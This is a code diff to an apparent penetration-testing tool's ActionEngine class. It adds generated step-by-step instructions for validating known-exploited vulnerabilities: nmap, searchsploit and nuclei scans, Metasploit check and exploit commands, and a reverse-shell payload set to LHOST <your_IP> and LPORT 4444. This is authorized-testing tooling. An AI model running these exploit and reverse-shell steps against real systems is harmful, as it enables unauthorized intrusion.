@@ -1166,6 +1166,189 @@ class ActionEngine:
         return recommendations
 
     @staticmethod
+    def _build_kev_instructions(finding, target, cves):
+        """Build detailed KEV verification instructions."""
+        cve_list = [c.strip() for c in (cves or "").split(",") if c.strip()]
+        title = finding.get("title", "")
+        port = finding.get("port", "")
+        service = finding.get("service", "")
+        ip = finding.get("ip", "")
+        desc = finding.get("description", "")
+        exploit_details = finding.get("exploit_details", [])
+        msf_modules = finding.get("metasploit_modules", [])
+        ss_terms = finding.get("searchsploit_terms", [])
+
+        steps = []
+        steps.append(
+            f"VULNERABILITY: {title}")
+        steps.append(
+            f"TARGET: {target}"
+            + (f" (port {port}/{service})" if port and service else
+               f" (port {port})" if port else ""))
+        if cve_list:
+            steps.append(
+                f"CVE(s): {', '.join(cve_list)}")
+        steps.append(
+            "This vulnerability is listed in the CISA Known Exploited "
+            "Vulnerabilities (KEV) catalog, meaning it has confirmed "
+            "active exploitation in the wild. Verification is CRITICAL.")
+        steps.append(
+            "--- RECONNAISSANCE ---")
+        steps.append(
+            f"1. Confirm the vulnerable service is running on {target}: "
+            f"nmap -sV -p {port} {ip}" if port and ip else
+            f"1. Confirm the vulnerable service is running on {target}")
+        if cve_list:
+            steps.append(
+                f"2. Search for public exploits: "
+                f"searchsploit {cve_list[0]}")
+            steps.append(
+                f"3. Check ExploitDB for PoC code: "
+                f"https://www.exploit-db.com/search?cve={cve_list[0]}")
+            steps.append(
+                f"4. Run targeted Nuclei scan: "
+                f"nuclei -u {target} -t cves/ -tags {cve_list[0].lower()}")
+        elif ss_terms:
+            steps.append(
+                f"2. Search for public exploits: "
+                f"searchsploit {ss_terms[0]}")
+        steps.append(
+            "--- EXPLOITATION ---")
+        if msf_modules:
+            for i, mod in enumerate(msf_modules):
+                steps.append(
+                    f"{5 + i}. Metasploit: msfconsole -q -x '"
+                    f"use {mod}; set RHOSTS {ip or target}; "
+                    f"set RPORT {port}; check'" if port else
+                    f"{5 + i}. Metasploit: msfconsole -q -x '"
+                    f"use {mod}; set RHOSTS {ip or target}; check'")
+        if exploit_details:
+            for ed in exploit_details:
+                if isinstance(ed, dict):
+                    ref = ed.get("url", ed.get("reference", ""))
+                    if ref:
+                        steps.append(
+                            f"   Review PoC: {ref}")
+        steps.append(
+            "--- DOCUMENTATION ---")
+        steps.append(
+            "Record all exploit attempts with timestamps, commands, "
+            "and full output. Screenshot successful exploitation. "
+            "If exploitation succeeds, document the level of access "
+            "obtained (read, write, RCE, privilege escalation).")
+        steps.append(
+            "--- RESOLUTION ---")
+        steps.append(
+            "Mark EXPLOITABLE if the vulnerability can be confirmed "
+            "and leveraged to impact confidentiality, integrity, or "
+            "availability. Mark NOT EXPLOITABLE if the service is "
+            "patched, mitigated, or the exploit fails despite confirmed "
+            "presence. Mark PARTIAL if the vulnerability is confirmed "
+            "but exploitation is limited (e.g. DoS only, requires "
+            "authentication, or WAF blocks the payload).")
+        return steps
+
+    @staticmethod
+    def _build_msf_instructions(finding, target, cves, msf_modules):
+        """Build detailed Metasploit/exploit validation instructions."""
+        cve_list = [c.strip() for c in (cves or "").split(",") if c.strip()]
+        title = finding.get("title", "")
+        port = finding.get("port", "")
+        service = finding.get("service", "")
+        ip = finding.get("ip", "")
+        exploit_details = finding.get("exploit_details", [])
+        ss_terms = finding.get("searchsploit_terms", [])
+
+        steps = []
+        steps.append(
+            f"VULNERABILITY: {title}")
+        steps.append(
+            f"TARGET: {target}"
+            + (f" (port {port}/{service})" if port and service else
+               f" (port {port})" if port else ""))
+        if cve_list:
+            steps.append(
+                f"CVE(s): {', '.join(cve_list)}")
+        if msf_modules:
+            steps.append(
+                f"METASPLOIT MODULE(S): {', '.join(msf_modules)}")
+        steps.append(
+            "--- PRE-TEST SETUP ---")
+        steps.append(
+            f"1. Confirm the target service is accessible: "
+            f"nmap -sV -p {port} {ip}" if port and ip else
+            f"1. Confirm the target service is accessible on {target}")
+        steps.append(
+            "2. Ensure Metasploit is updated: msfupdate")
+        steps.append(
+            "3. Start Metasploit with database: "
+            "msfdb init && msfconsole -q")
+        steps.append(
+            "--- METASPLOIT TESTING ---")
+        if msf_modules:
+            for i, mod in enumerate(msf_modules):
+                step_n = 4 + (i * 6)
+                steps.append(
+                    f"{step_n}. Load module: use {mod}")
+                steps.append(
+                    f"{step_n + 1}. Configure target: "
+                    f"set RHOSTS {ip or target}"
+                    + (f"; set RPORT {port}" if port else ""))
+                steps.append(
+                    f"{step_n + 2}. Run vulnerability check "
+                    f"(non-destructive): check")
+                steps.append(
+                    f"{step_n + 3}. If check confirms, review "
+                    f"module options: show options")
+                steps.append(
+                    f"{step_n + 4}. Set payload (if exploit module): "
+                    f"set PAYLOAD generic/shell_reverse_tcp; "
+                    f"set LHOST <your_IP>; set LPORT 4444")
+                steps.append(
+                    f"{step_n + 5}. Execute with authorization: "
+                    f"exploit -j")
+        steps.append(
+            "--- ALTERNATIVE VALIDATION ---")
+        if cve_list:
+            steps.append(
+                f"Search ExploitDB: searchsploit {cve_list[0]}")
+            steps.append(
+                f"Nuclei targeted scan: "
+                f"nuclei -u {target} -t cves/ -tags {cve_list[0].lower()}")
+        elif ss_terms:
+            steps.append(
+                f"Search ExploitDB: searchsploit {ss_terms[0]}")
+        if exploit_details:
+            for ed in exploit_details:
+                if isinstance(ed, dict):
+                    ref = ed.get("url", ed.get("reference", ""))
+                    if ref and "github.com" in ref:
+                        steps.append(
+                            f"Review GitHub PoC: {ref}")
+                    elif ref:
+                        steps.append(
+                            f"Review reference: {ref}")
+        steps.append(
+            "--- DOCUMENTATION ---")
+        steps.append(
+            "For each module tested, record: (a) module path, "
+            "(b) exact options used, (c) check output, "
+            "(d) exploit output if executed, (e) level of access "
+            "achieved (shell, meterpreter, file read, DoS). "
+            "Screenshot all successful sessions. Save session "
+            "logs: spool /tmp/<engagement>_msf.log")
+        steps.append(
+            "--- RESOLUTION ---")
+        steps.append(
+            "Mark EXPLOITABLE if any module achieves code execution, "
+            "credential access, or data exfiltration. Mark NOT "
+            "EXPLOITABLE if all modules fail or the check reports "
+            "not vulnerable. Mark PARTIAL if the check confirms the "
+            "vulnerability but exploitation is limited (e.g. DoS-only, "
+            "requires specific conditions, or is blocked by controls).")
+        return steps
+
+    @staticmethod
     def _finding_target(finding):
         ip = finding.get("ip", "")
         if not ip:
@@ -1295,7 +1478,10 @@ class ActionEngine:
         cves = finding.get("cves", "")
 
         if finding.get("kev"):
+            kev_instructions = self._build_kev_instructions(
+                finding, target, cves)
             item = self._add_or_collect(project_dir, {
+                "type": "exploit_test",
                 "source_tool": source_tool,
                 "recommended_tool": None,
                 "category": "kev_finding",
@@ -1309,7 +1495,27 @@ class ActionEngine:
                     "finding_id": finding.get("id"),
                     "risk": risk,
                     "cves": cves,
+                    "instructions": kev_instructions,
+                    "kev_data": {
+                        "cves": cves,
+                        "exploit_details": finding.get("exploit_details", []),
+                        "searchsploit_terms": finding.get(
+                            "searchsploit_terms", []),
+                    },
                     "recommendations": recommendations,
+                    "finding_template": {
+                        "title": f"KEV Exploitable: {title}",
+                        "risk": "CRITICAL",
+                        "description": (
+                            f"The vulnerability \"{title}\" on {target} is "
+                            f"listed in the CISA Known Exploited "
+                            f"Vulnerabilities (KEV) catalog and was "
+                            f"confirmed exploitable during manual testing."
+                        ),
+                        "remediation": finding.get("remediation", ""),
+                        "cwe": finding.get("cwe", []),
+                        "owasp_web": finding.get("owasp", ""),
+                    },
                 },
             }, _collector)
             if item:
@@ -1330,7 +1536,15 @@ class ActionEngine:
             or _rce_cred
         )
         if not is_self_validated and _needs_validation:
+            all_modules = list(msf_modules)
+            if type_rec:
+                for m in type_rec.get("msf", []):
+                    if m not in all_modules:
+                        all_modules.append(m)
+            msf_instructions = self._build_msf_instructions(
+                finding, target, cves, all_modules)
             item = self._add_or_collect(project_dir, {
+                "type": "exploit_test",
                 "source_tool": source_tool,
                 "recommended_tool": None,
                 "category": "exploit_available",
@@ -1344,7 +1558,24 @@ class ActionEngine:
                     "finding_id": finding.get("id"),
                     "risk": risk,
                     "vuln_type": type_rec["patterns"][0] if type_rec else None,
+                    "instructions": msf_instructions,
+                    "msf_modules": all_modules,
+                    "exploit_details": finding.get("exploit_details", []),
+                    "searchsploit_terms": finding.get(
+                        "searchsploit_terms", []),
                     "recommendations": recommendations,
+                    "finding_template": {
+                        "title": f"Exploit Confirmed: {title}",
+                        "risk": risk,
+                        "description": (
+                            f"The vulnerability \"{title}\" on {target} was "
+                            f"confirmed exploitable during manual testing "
+                            f"using {'Metasploit module ' + all_modules[0] if all_modules else 'manual exploitation techniques'}."
+                        ),
+                        "remediation": finding.get("remediation", ""),
+                        "cwe": finding.get("cwe", []),
+                        "owasp_web": finding.get("owasp", ""),
+                    },
                 },
             }, _collector)
             if item:
@@ -1585,7 +1816,17 @@ class ActionEngine:
 
         items = []
         scope_def = (project or {}).get("scope_definition") or {}
-        targets = scope_def.get("targets") or scope_def.get("urls") or []
+        targets = []
+        if source_tool == "siphon":
+            targets = scope_def.get("api_urls") or []
+        elif source_tool == "fracture":
+            targets = scope_def.get("target_urls") or []
+        if not targets:
+            targets = (scope_def.get("target_urls")
+                       or scope_def.get("api_urls")
+                       or scope_def.get("targets")
+                       or scope_def.get("urls")
+                       or [])
         if isinstance(targets, str):
             targets = [targets]
         targets = list(targets) if targets else []
